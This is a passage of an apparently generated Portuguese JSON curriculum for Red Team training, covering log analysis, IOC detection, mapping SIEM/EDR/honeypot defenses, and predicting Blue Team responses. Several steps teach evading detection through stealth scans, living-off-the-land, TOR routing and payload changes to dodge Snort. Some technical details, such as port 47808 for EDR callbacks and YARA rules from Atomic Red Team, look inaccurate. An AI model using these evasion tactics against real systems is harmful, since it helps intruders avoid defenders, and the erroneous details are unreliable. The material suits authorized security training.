                                "Precisão e completude da lista de ativos (30%)",
                                "Qualidade da avaliação de criticidade e priorização (25%)",
                                "Detalhamento do plano de foco de ataque (20%)",
                                "Uso efetivo de ferramentas e documentação (15%)",
                                "Identificação de riscos e mitigações (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de planilhas e scripts para processamento de dados de scan.",
                                "Gerenciamento de Projetos: Priorização usando matrizes como Eisenhower.",
                                "Redes de Computadores: Compreensão de topologias e protocolos para mapeamento.",
                                "Gestão de Riscos: Avaliação qualitativa/quantitativa de ameaças.",
                                "Inteligência de Ameaças: Integração de OSINT na priorização."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests, essa habilidade permite focar recursos limitados nos ativos de maior valor, maximizando impacto em exercícios de jogos de guerra cibernética, como simular um APT targeting infra crítica de uma empresa."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.2",
                        "name": "Compreensão do Contexto Operacional",
                        "description": "Interpretar os dados coletados para entender o estado atual do ambiente, incluindo configurações de segurança, padrões de comportamento e possíveis pontos de entrada para o Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.2.1",
                            "name": "Análise de Logs de Sistema",
                            "description": "Examinar logs de firewalls, IDS/IPS e sistemas operacionais em tempo real para compreender respostas de defesa e padrões de uso normal do ambiente alvo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação e Acesso aos Logs de Sistema",
                                  "subSteps": [
                                    "Instale e configure ferramentas de monitoramento como journalctl (Linux), Event Viewer (Windows) ou ferramentas web para firewalls/IDS.",
                                    "Configure coleta de logs em tempo real de firewalls (ex: pfSense), IDS/IPS (ex: Snort, Suricata) e SO.",
                                    "Defina filtros iniciais por data/hora, IP origem/destino e tipo de evento.",
                                    "Teste o acesso abrindo sessões de log em terminais ou interfaces gráficas.",
                                    "Crie um workspace dedicado para análise com múltiplas janelas de logs abertas."
                                  ],
                                  "verification": "Confirme acesso bem-sucedido visualizando logs recentes sem erros de permissão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Máquina virtual com Linux/Windows",
                                    "Ferramentas: journalctl, syslog-ng, Splunk Free ou ELK Stack básico",
                                    "Documentação oficial das ferramentas"
                                  ],
                                  "tips": "Use comandos como 'tail -f /var/log/syslog' para monitoramento em tempo real e salve configurações de filtro para reutilização.",
                                  "learningObjective": "Configurar e acessar logs de múltiplas fontes de forma eficiente e segura.",
                                  "commonMistakes": [
                                    "Não verificar permissões de root/sudo levando a erros de acesso",
                                    "Ignorar rotação de logs causando perda de dados recentes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecimento de Baseline de Padrões Normais",
                                  "subSteps": [
                                    "Colete logs de pelo menos 24-48 horas de operação normal sem incidentes.",
                                    "Analise métricas como volume de tráfego, portas comuns, IPs frequentes e eventos recorrentes.",
                                    "Crie um resumo estatístico: médias de conexões/hora, picos de atividade e eventos benignos típicos.",
                                    "Documente padrões normais em uma tabela (ex: horário de backups, acessos administrativos).",
                                    "Valide o baseline com dados históricos se disponíveis."
                                  ],
                                  "verification": "Produza um relatório de baseline com pelo menos 5 padrões identificados e gráficos simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Planilha Excel/Google Sheets para resumos",
                                    "Ferramentas de grep/awk para contagem rápida",
                                    "Logs de baseline pré-coletados"
                                  ],
                                  "tips": "Foquem em horários: compare dias úteis vs. fins de semana para capturar variações normais.",
                                  "learningObjective": "Reconhecer e documentar o comportamento baseline do ambiente para referência futura.",
                                  "commonMistakes": [
                                    "Baseline curto demais ignorando variações sazonais",
                                    "Confundir ruído de rede normal com anomalias"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificação de Anomalias nos Logs",
                                  "subSteps": [
                                    "Aplique filtros para eventos incomuns: picos de tráfego, IPs desconhecidos, falhas de autenticação.",
                                    "Compare eventos atuais com baseline: desvios >20% em métricas chave.",
                                    "Busque assinaturas de ataques: scans de porta (SYN floods), tentativas de exploit em logs IDS.",
                                    "Correlacione logs entre fontes: firewall bloqueou IP que IDS flagou como suspeito.",
                                    "Marque anomalias com timestamps exatos para timeline."
                                  ],
                                  "verification": "Liste pelo menos 3 anomalias potenciais com evidências de logs e comparação ao baseline.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas: grep, awk, scripts Python simples para parsing",
                                    "Exemplos de logs com anomalias simuladas"
                                  ],
                                  "tips": "Use cores ou highlights em ferramentas como Splunk para anomalias; priorize por severidade (alta volume primeiro).",
                                  "learningObjective": "Detectar desvios do baseline usando filtros e correlação manual.",
                                  "commonMistakes": [
                                    "Sobrecarga de falsos positivos sem contexto baseline",
                                    "Ignorar anomalias de baixa frequência mas críticas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise de Respostas de Defesa e Padrões de Uso",
                                  "subSteps": [
                                    "Examine ações de defesa: bloqueios de firewall, alertas IPS, quarentenas automáticas.",
                                    "Avalie eficácia: ataque mitigado? Lacunas na defesa identificadas?",
                                    "Reconstrua sequências de eventos: timeline de um incidente desde detecção até resposta.",
                                    "Analise padrões de uso normal vs. malicioso: latência, payloads suspeitos.",
                                    "Teste hipóteses: simule tráfego similar para validar respostas."
                                  ],
                                  "verification": "Crie uma timeline visual de um incidente com respostas de defesa destacadas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta de timeline como draw.io ou Lucidchart",
                                    "Logs com respostas de defesa simuladas"
                                  ],
                                  "tips": "Pergunte: 'O que aconteceria sem essa defesa?' para avaliar impacto.",
                                  "learningObjective": "Interpretar respostas automatizadas de defesa e gaps no ambiente.",
                                  "commonMistakes": [
                                    "Atribuir causalidade sem correlação temporal",
                                    "Subestimar respostas parciais como falhas totais"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentação e Relatório de Análise",
                                  "subSteps": [
                                    "Compile achados: anomalias, respostas, recomendações.",
                                    "Gere relatório estruturado: resumo executivo, evidências de logs, baseline atualizado.",
                                    "Sugira ações: regras de firewall novas, monitoramento aprimorado.",
                                    "Compartilhe relatório em formato seguro (PDF/ferramenta SIEM).",
                                    "Atualize baseline com novos padrões observados."
                                  ],
                                  "verification": "Produza e revise um relatório completo com todas as seções preenchidas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Template de relatório em Markdown/Word",
                                    "Ferramentas de exportação de logs"
                                  ],
                                  "tips": "Use screenshots de logs no relatório para evidências irrefutáveis.",
                                  "learningObjective": "Comunicar achados de análise de forma clara e acionável.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem evidências",
                                    "Omitir recomendações preventivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com pfSense firewall e Snort IDS em VM Ubuntu, simule um Nmap scan de portas (nmap -sS targetIP). Acesse logs em tempo real via /var/log/snort/alert e pfSense UI, identifique picos de SYN packets de IP externo, confirme bloqueio automático e documente a resposta em uma timeline.",
                              "finalVerifications": [
                                "Acessa e filtra logs de múltiplas fontes em <5 minutos.",
                                "Identifica corretamente 80% das anomalias simuladas vs. baseline.",
                                "Reconstrói timeline precisa de um incidente com respostas de defesa.",
                                "Produz relatório com evidências e recomendações acionáveis.",
                                "Atualiza baseline após análise com novas entradas.",
                                "Diferencia padrões normais de maliciosos em cenários reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de anomalias (sem falsos negativos >10%).",
                                "Qualidade do baseline: cobertura de variações temporais.",
                                "Profundidade da correlação entre logs de firewall/IDS/SO.",
                                "Clareza e completude do relatório (todas seções presentes).",
                                "Eficiência temporal: análise completa em <3 horas.",
                                "Incorporação de dicas para evitar erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de estatísticas para baselines e detecção de outliers.",
                                "Redes de Computadores: Compreensão de protocolos e tráfego normal.",
                                "Programação: Scripts para parsing automatizado de logs (Python/Bash).",
                                "Estatística: Cálculo de médias, desvios e thresholds.",
                                "Gestão de Incidentes: Relatórios e comunicação em cibersegurança."
                              ],
                              "realWorldApplication": "Analistas de SOC (Security Operations Center) monitoram logs em tempo real para detectar intrusões durante ataques reais, como DDoS ou ransomware, permitindo respostas rápidas que evitam breaches em empresas como bancos ou governos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.2.2",
                            "name": "Detecção de Indicadores de Compromisso (IOC)",
                            "description": "Reconhecer IOCs como hashes de malware, IPs suspeitos e padrões de tráfego malicioso, correlacionando-os com o contexto atual da operação cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de IOCs",
                                  "subSteps": [
                                    "Estude a definição de IOCs e sua importância na detecção de ameaças cibernéticas.",
                                    "Classifique tipos de IOCs: hashes (MD5, SHA-256), IPs/domínios suspeitos, padrões de tráfego (ex.: beacons).",
                                    "Revise exemplos reais de IOCs de relatórios como MITRE ATT&CK.",
                                    "Memorize fontes comuns de IOCs: logs de firewall, SIEM, EDR.",
                                    "Pratique listando 10 IOCs hipotéticos."
                                  ],
                                  "verification": "Criar uma tabela com 5 tipos de IOCs, exemplos e fontes, revisada por um mentor.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Guia IOCs da SANS Institute",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use mnemônicos para lembrar tipos de IOCs, como 'H-I-P-T' (Hashes, IPs, Patterns, Traffic).",
                                  "learningObjective": "Definir IOCs e listar principais tipos com exemplos.",
                                  "commonMistakes": [
                                    "Confundir IOCs com IOAs (Indicators of Attack)",
                                    "Ignorar contexto histórico de IOCs",
                                    "Listar IOCs desatualizados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar IOCs em Dados de Rede e Logs",
                                  "subSteps": [
                                    "Instale ferramentas como Wireshark para captura de tráfego.",
                                    "Analise logs de firewall/IDS para IPs suspeitos e padrões anômalos.",
                                    "Busque IOCs em tráfego: conexões C2, exfiltração de dados.",
                                    "Use grep/regex para filtrar IOCs em logs de texto.",
                                    "Valide IOCs contra feeds como AlienVault OTX ou VirusTotal."
                                  ],
                                  "verification": "Analisar um log de amostra e destacar 3 IOCs com justificativa.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Wireshark",
                                    "Amostras de logs PCAP (de sites como Malware-Traffic-Analysis)",
                                    "VirusTotal API gratuita"
                                  ],
                                  "tips": "Filtre por portas comuns de malware (ex.: 4444, 8080) para agilizar análise.",
                                  "learningObjective": "Detectar IOCs de rede em tráfego e logs reais.",
                                  "commonMistakes": [
                                    "Interpretar tráfego benigno como malicioso",
                                    "Não validar IOCs em múltiplas fontes",
                                    "Ignorar timestamps nos logs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar IOCs em Arquivos e Hashes de Malware",
                                  "subSteps": [
                                    "Aprenda a calcular hashes (MD5/SHA) de arquivos suspeitos.",
                                    "Use VirusTotal para verificar hashes contra bases de malware.",
                                    "Identifique YARA rules para padrões em binários.",
                                    "Extraia strings e analise PE headers para IOCs.",
                                    "Compare hashes com threat intelligence feeds."
                                  ],
                                  "verification": "Verificar 5 hashes de amostra e relatar matches de malware.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "HashCalc ou PowerShell Get-FileHash",
                                    "VirusTotal",
                                    "YARA rules de Atomic Red Team"
                                  ],
                                  "tips": "Salve hashes em formato padronizado para relatórios rápidos.",
                                  "learningObjective": "Validar arquivos via hashes e regras de detecção.",
                                  "commonMistakes": [
                                    "Usar hash fraco como MD5 sozinho",
                                    "Confiar em um único scan",
                                    "Não considerar packing de malware"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar IOCs com o Contexto Operacional",
                                  "subSteps": [
                                    "Mapeie IOCs ao ciclo de vida do ataque (MITRE ATT&CK).",
                                    "Integre IOCs com timeline de eventos da operação.",
                                    "Avalie severidade: frequência, impacto no ambiente.",
                                    "Crie regras SIEM para alertas baseados em IOCs correlacionados.",
                                    "Simule resposta: priorize IOCs por contexto (ex.: produção vs. teste)."
                                  ],
                                  "verification": "Produzir relatório correlacionando 3 IOCs a um cenário simulado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Splunk free ou ELK Stack trial",
                                    "Cenários de jogos de guerra cibernética"
                                  ],
                                  "tips": "Use matrizes de decisão para priorizar IOCs por risco.",
                                  "learningObjective": "Integrar IOCs ao contexto para decisões informadas.",
                                  "commonMistakes": [
                                    "Isolar IOCs sem contexto",
                                    "Sobrecarregar com falsos positivos",
                                    "Ignorar kill chain"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de simulação de ataque, analise logs de um servidor comprometido: detecte IP 192.168.1.100 (conhecido C2), hash SHA-256 de malware baixado e padrão de beacon a cada 60s. Correlacione com pico de CPU no host para confirmar infecção ativa.",
                              "finalVerifications": [
                                "Listar e explicar 5 tipos de IOCs com exemplos reais.",
                                "Analisar tráfego PCAP e identificar 3 IOCs de rede.",
                                "Validar hash de malware via VirusTotal com relatório.",
                                "Correlacionar IOCs a um TTP do MITRE ATT&CK.",
                                "Criar regra SIEM para detecção automática de IOC.",
                                "Priorizar IOCs em cenário operacional simulado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de IOCs (sem falsos negativos >10%).",
                                "Corretude na correlação com contexto (cobertura >80% de eventos).",
                                "Eficiência temporal: análise completa em <4 horas.",
                                "Qualidade do relatório: claro, com evidências e recomendações.",
                                "Validação cruzada com threat intel (mínimo 2 fontes).",
                                "Capacidade de reduzir falsos positivos via contexto."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos e tráfego (Wireshark).",
                                "Análise de Malware: Engenharia reversa básica.",
                                "Inteligência de Ameaças: Uso de feeds e OSINT.",
                                "Gestão de Incidentes: Resposta e priorização.",
                                "Dados: Regex, SIEM e visualização de timelines."
                              ],
                              "realWorldApplication": "Em um SOC, analistas usam IOCs para detectar brechas em tempo real, como durante um ransomware attack, correlacionando IPs maliciosos com logs para isolar hosts e mitigar danos em operações críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.2.3",
                            "name": "Mapeamento de Defesas Ativas",
                            "description": "Identificar e mapear ferramentas de segurança como SIEM, EDR e honeypots ativas no ambiente para evitar detecção durante simulações de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisa e Inteligência sobre Ferramentas de Defesa Comuns",
                                  "subSteps": [
                                    "Liste ferramentas comuns de SIEM (ex: Splunk, ELK Stack), EDR (ex: CrowdStrike, Microsoft Defender) e honeypots (ex: Cowrie, Dionaea).",
                                    "Estude características únicas de cada ferramenta: logs gerados, portas padrão, fingerprints de rede.",
                                    "Colete OSINT sobre versões comuns usadas em ambientes corporativos via sites como Shodan ou relatórios de threat intel.",
                                    "Crie um banco de dados inicial com signatures (ex: user-agents, banners de serviço).",
                                    "Analise documentações oficiais para comportamentos de detecção."
                                  ],
                                  "verification": "Banco de dados populado com pelo menos 10 ferramentas e suas signatures documentadas em um relatório.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramentas OSINT: Shodan, Censys",
                                    "Planilha ou ferramenta como Notion/Excel"
                                  ],
                                  "tips": "Priorize ferramentas open-source para testes iniciais; use VPN para anonimato durante OSINT.",
                                  "learningObjective": "Compreender fingerprints e comportamentos de ferramentas de defesa para reconhecimento futuro.",
                                  "commonMistakes": [
                                    "Ignorar variações de versões",
                                    "Confundir honeypots com serviços legítimos sem validação",
                                    "Não documentar fontes de OSINT"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecimento Passivo do Ambiente-Alvo",
                                  "subSteps": [
                                    "Configure ferramentas passivas como Wireshark ou tcpdump para capturar tráfego sem envio de pacotes.",
                                    "Monitore portas comuns associadas a defesas (ex: 514 UDP para syslog, 47808 para EDR callbacks).",
                                    "Analise DNS queries e respostas para domínios conhecidos de SIEM/EDR (ex: *.splunk.com).",
                                    "Observe padrões de tráfego anômalo indicando honeypots (ex: respostas rápidas a probes).",
                                    "Registre timestamps e volumes de tráfego para baseline."
                                  ],
                                  "verification": "Relatório de tráfego capturado com pelo menos 5 potenciais indicators de defesas identificados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Wireshark/tcpdump",
                                    "Ambiente de lab virtual (ex: VirtualBox com rede simulada)",
                                    "Lista de IOCs de defesas"
                                  ],
                                  "tips": "Use filtros BPF no Wireshark para eficiência; capture em horários de pico para mais dados.",
                                  "learningObjective": "Desenvolver habilidades de monitoramento passivo para mapear defesas sem alertá-las.",
                                  "commonMistakes": [
                                    "Enviar probes ativos acidentalmente",
                                    "Não calibrar filtros corretamente",
                                    "Ignorar tráfego criptografado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detecção e Identificação Específica de Ferramentas",
                                  "subSteps": [
                                    "Execute scans leves e não-intrusivos como Nmap com scripts NSE para detecção de serviços (ex: nmap -sV --script=http-title).",
                                    "Use ferramentas como edr-scanner ou honeypot-detectors para fingerprints específicos.",
                                    "Correlacione logs capturados com signatures conhecidas (ex: busca por 'EDR' em user-agents).",
                                    "Teste interações mínimas: envie payloads benignos e observe respostas de honeypots.",
                                    "Valide achados com múltiplas fontes para reduzir falsos positivos."
                                  ],
                                  "verification": "Mapa preliminar com pelo menos 3 ferramentas identificadas, incluindo evidências (screenshots/logs).",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Nmap com scripts NSE",
                                    "Ferramentas especializadas: Atomic Red Team (módulo de detecção)",
                                    "Lab com defesas simuladas (ex: ELK + Cowrie)"
                                  ],
                                  "tips": "Comece com TTL baixo em scans para simular origem interna; rate-limit probes.",
                                  "learningObjective": "Identificar ativamente ferramentas de defesa usando técnicas stealth.",
                                  "commonMistakes": [
                                    "Scans agressivos que disparam alertas",
                                    "Confiar em um único detector",
                                    "Não correlacionar múltiplos IOCs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapeamento, Documentação e Planejamento de Evasão",
                                  "subSteps": [
                                    "Crie um diagrama visual (ex: usando Draw.io) mapeando localização, tipo e cobertura das defesas.",
                                    "Documente pontos fracos: gaps em cobertura, falsos negativos conhecidos.",
                                    "Planeje táticas de evasão: ex: living-off-the-land para SIEM, timing attacks para EDR.",
                                    "Simule cenários de bypass em lab e registre resultados.",
                                    "Revise e atualize o mapa com lições aprendidas."
                                  ],
                                  "verification": "Diagrama completo e plano de evasão documentado, testado em pelo menos um cenário simulado.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Draw.io ou Lucidchart",
                                    "Documentação de evasões (ex: LOLBAS, MITRE ATT&CK)",
                                    "Lab de simulação"
                                  ],
                                  "tips": "Use camadas de abstração no diagrama (rede, host, cloud); priorize defesas de alto impacto.",
                                  "learningObjective": "Transformar inteligência coletada em um mapa acionável para operações stealth.",
                                  "commonMistakes": [
                                    "Mapa incompleto sem cobertura geográfica",
                                    "Ignorar defesas em nuvem",
                                    "Planos de evasão não testados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com uma rede corporativa simulada (Windows Server com Microsoft Defender EDR, Splunk SIEM e Cowrie honeypot), capture tráfego passivo por 1 hora, identifique o honeypot via respostas rápidas a probes DNS, mapeie o EDR via callbacks para azure.com e evite detecção ajustando payloads para living-off-the-land.",
                              "finalVerifications": [
                                "Mapa de defesas inclui pelo menos SIEM, EDR e honeypot com evidências.",
                                "Teste de evasão bem-sucedido sem alertas em simulação.",
                                "Diagrama visual cobre topologia de rede e pontos de cobertura.",
                                "Relatório lista 5+ IOCs validados.",
                                "Plano de evasão alinhado com MITRE ATT&CK táticas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação (90%+ taxa de acerto em lab).",
                                "Stealth: zero alertas durante reconhecimento.",
                                "Completude do mapa (todos os componentes cobertos).",
                                "Qualidade da documentação (clara, visual, acionável).",
                                "Criatividade em táticas de evasão baseadas em evidências.",
                                "Tempo de execução dentro do estimado."
                              ],
                              "crossCurricularConnections": [
                                "OSINT e Reconhecimento (SC-01 Introdução à Segurança Cibernética).",
                                "Análise de Rede e Tráfego (Networking Fundamentals).",
                                "MITRE ATT&CK Framework (SC-06 Operações Cibernéticas).",
                                "Ferramentas de Automação (Scripting em Python/Bash).",
                                "Threat Hunting (Defesa Cibernética)"
                              ],
                              "realWorldApplication": "Durante engajamentos de Red Team em pentests autorizados, mapeie defesas para planejar ataques stealth, permitindo simulações realistas de APTs sem detecção prematura, essencial para validação de maturidade de SOCs em organizações financeiras ou governamentais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.3",
                        "name": "Projeção e Adaptação em Tempo Real",
                        "description": "Prever evoluções no ambiente cibernético e adaptar estratégias de ataque com base na consciência situacional adquirida, alinhando com regras de engajamento do Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.3.1",
                            "name": "Previsão de Respostas Defensivas",
                            "description": "Analisar tendências em tempo real para antecipar ações da Blue Team, como bloqueios de IP ou atualizações de patches, e planejar pivôs alternativos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Monitoramento em Tempo Real",
                                  "subSteps": [
                                    "Instale ferramentas de monitoramento como Wireshark ou tcpdump para capturar tráfego de rede.",
                                    "Configure alertas para mudanças em logs de firewall, IDS/IPS e atualizações de sistema.",
                                    "Integre feeds de telemetria de hosts comprometidos para rastrear detecções em tempo real.",
                                    "Defina baselines de tráfego normal para identificar anomalias rapidamente.",
                                    "Teste o setup com tráfego simulado para validar a captura de dados."
                                  ],
                                  "verification": "Confirme que logs e alertas estão sendo recebidos em tempo real sem atrasos >5s via dashboard.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Wireshark/tcpdump",
                                    "ELK Stack ou Splunk (versão trial)",
                                    "Máquina virtual para simulação",
                                    "Documentação de IDS como Snort"
                                  ],
                                  "tips": "Use filtros personalizados no Wireshark para focar apenas em tráfego suspeito e reduzir ruído.",
                                  "learningObjective": "Configurar ferramentas para coleta contínua de dados de rede e logs defensivos.",
                                  "commonMistakes": [
                                    "Ignorar configuração de filtros, levando a sobrecarga de dados.",
                                    "Não testar o setup, resultando em falhas durante operações reais.",
                                    "Esquecer de mascarar dados sensíveis em logs."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar e Analisar Tendências Históricas",
                                  "subSteps": [
                                    "Revise logs passados de engajamentos para mapear respostas comuns da Blue Team (ex: bloqueios IP após scans).",
                                    "Categorize eventos por tipo: detecção de scans, atualizações de patches, quarentenas.",
                                    "Calcule frequências e tempos médios de resposta usando planilhas ou scripts Python.",
                                    "Identifique padrões sazonais ou baseados em ferramentas usadas (ex: Nmap triggers).",
                                    "Crie um dashboard visual com gráficos de tendências para análise rápida."
                                  ],
                                  "verification": "Gere um relatório resumido com pelo menos 5 padrões identificados e suas probabilidades.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Logs históricos de CTFs ou simulações",
                                    "Python com Pandas/Matplotlib",
                                    "Google Sheets ou Excel",
                                    "Ferramentas como Zeek para análise de logs"
                                  ],
                                  "tips": "Priorize dados de engajamentos semelhantes para maior relevância nas previsões.",
                                  "learningObjective": "Extrair insights acionáveis de dados históricos de respostas defensivas.",
                                  "commonMistakes": [
                                    "Focar apenas em eventos recentes, ignorando padrões de longo prazo.",
                                    "Não quantificar probabilidades, levando a previsões subjetivas.",
                                    "Sobrecarregar análise com dados irrelevantes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modelar Previsões de Respostas Defensivas",
                                  "subSteps": [
                                    "Mapeie cenários atuais contra padrões históricos para prever ações prováveis (ex: bloqueio IP em 70% dos casos).",
                                    "Use árvores de decisão simples para ramificar respostas baseadas em triggers observados.",
                                    "Incorpore variáveis como hora do dia ou feriados que afetam velocidade de resposta.",
                                    "Simule 3-5 cenários com ferramentas como MITRE ATT&CK Navigator.",
                                    "Atribua scores de confiança (alta/média/baixa) a cada previsão."
                                  ],
                                  "verification": "Documente 3 previsões específicas com justificativas e scores de confiança >70%.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Draw.io para árvores de decisão",
                                    "Scripts Python para simulação probabilística"
                                  ],
                                  "tips": "Atualize modelos dinamicamente com novos dados em tempo real para refinar precisão.",
                                  "learningObjective": "Desenvolver modelos preditivos baseados em dados para antecipar contra-medidas.",
                                  "commonMistakes": [
                                    "Superestimar raridade de respostas comuns como bloqueios IP.",
                                    "Ignorar fatores humanos na Blue Team, como fadiga.",
                                    "Não validar modelos com dados de teste."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Planejar e Testar Pivôs Alternativos",
                                  "subSteps": [
                                    "Para cada previsão, liste 2-3 pivôs (ex: trocar IP via VPN, mudar user-agent).",
                                    "Priorize pivôs por viabilidade, stealth e tempo de implementação.",
                                    "Crie playbooks automatizados com scripts para execução rápida.",
                                    "Teste pivôs em ambiente isolado simulando a resposta prevista.",
                                    "Avalie impacto nos objetivos da missão e refine planos."
                                  ],
                                  "verification": "Execute um pivô simulado com sucesso, confirmando bypass da defesa prevista.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "VPNs como OpenVPN",
                                    "Scripts Bash/Python para pivôs",
                                    "Lab virtual com defensas simuladas (ex: Security Onion)"
                                  ],
                                  "tips": "Mantenha pivôs em camadas: primário, secundário, terciário para redundância.",
                                  "learningObjective": "Criar planos de contingência robustos para adaptação em tempo real.",
                                  "commonMistakes": [
                                    "Pivôs não testados que falham sob pressão.",
                                    "Ignorar detecção de pivôs frequentes (ex: múltiplas trocas de IP).",
                                    "Planos muito complexos que demoram >2min para executar."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um CTF de red team, você observa spikes em logs de IDS após um scan Nmap. Previsão: Blue Team bloqueará seu IP em 10min. Pivô: Rota tráfego via TOR e muda payload para evitar assinatura Snort, mantendo acesso ao host alvo.",
                              "finalVerifications": [
                                "Previsão correta de pelo menos 80% das ações da Blue Team em simulação de 30min.",
                                "Pivôs executados com sucesso sem detecção adicional.",
                                "Tempo total de adaptação <5min por resposta prevista.",
                                "Dashboard de monitoramento atualizado e funcional.",
                                "Relatório de lições aprendidas com padrões identificados."
                              ],
                              "assessmentCriteria": [
                                "Precisão das previsões (>75% em testes).",
                                "Completude dos pivôs (cobertura de todos cenários previstos).",
                                "Eficiência temporal (adaptação rápida).",
                                "Qualidade da análise de dados (uso de métricas quantitativas).",
                                "Criatividade e stealth dos pivôs.",
                                "Documentação clara e acionável."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de Pandas para tendências.",
                                "Probabilidade e Estatística: Modelagem de riscos.",
                                "Psicologia Comportamental: Previsão de respostas humanas.",
                                "Programação: Scripts para automação de pivôs.",
                                "Gestão de Projetos: Planejamento de contingências."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, como pentests autorizados, permite manter persistência durante hunts da Blue Team, minimizando tempo de interrupção e maximizando sucesso da missão em ambientes como bancos ou governos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.3.2",
                            "name": "Atualização Contínua do Modelo Situacional",
                            "description": "Manter um modelo dinâmico da situação cibernética usando ferramentas como dashboards personalizados para decisões rápidas em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Modelo Situacional Dinâmico",
                                  "subSteps": [
                                    "Estudar definições de consciência situacional e modelos dinâmicos em cibersegurança",
                                    "Analisar diferenças entre modelos estáticos e dinâmicos com exemplos de jogos de guerra cibernética",
                                    "Identificar componentes essenciais: coleta de dados, visualização e alertas em tempo real",
                                    "Mapear fluxos de atualização contínua em cenários de ameaça cibernética",
                                    "Revisar casos reais de falhas por falta de atualização dinâmica"
                                  ],
                                  "verification": "Criar um diagrama resumindo os componentes e fluxos do modelo dinâmico",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigos da NIST sobre consciência situacional",
                                    "Vídeos tutoriais sobre modelos em cibersegurança",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Relacione sempre com cenários de jogos de guerra para contextualizar",
                                  "learningObjective": "Dominar os conceitos teóricos de um modelo situacional dinâmico aplicado a operações cibernéticas",
                                  "commonMistakes": [
                                    "Confundir modelo dinâmico com monitoramento estático",
                                    "Ignorar a integração de múltiplas fontes de dados",
                                    "Subestimar a velocidade de atualização necessária"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar e Configurar Ferramentas de Dashboards Personalizados",
                                  "subSteps": [
                                    "Pesquisar ferramentas como Grafana, Kibana ou Dash (Python) para dashboards cibernéticos",
                                    "Instalar e configurar uma ferramenta escolhida em ambiente local ou nuvem",
                                    "Criar painéis iniciais com métricas básicas: tráfego de rede, logs de eventos e alertas",
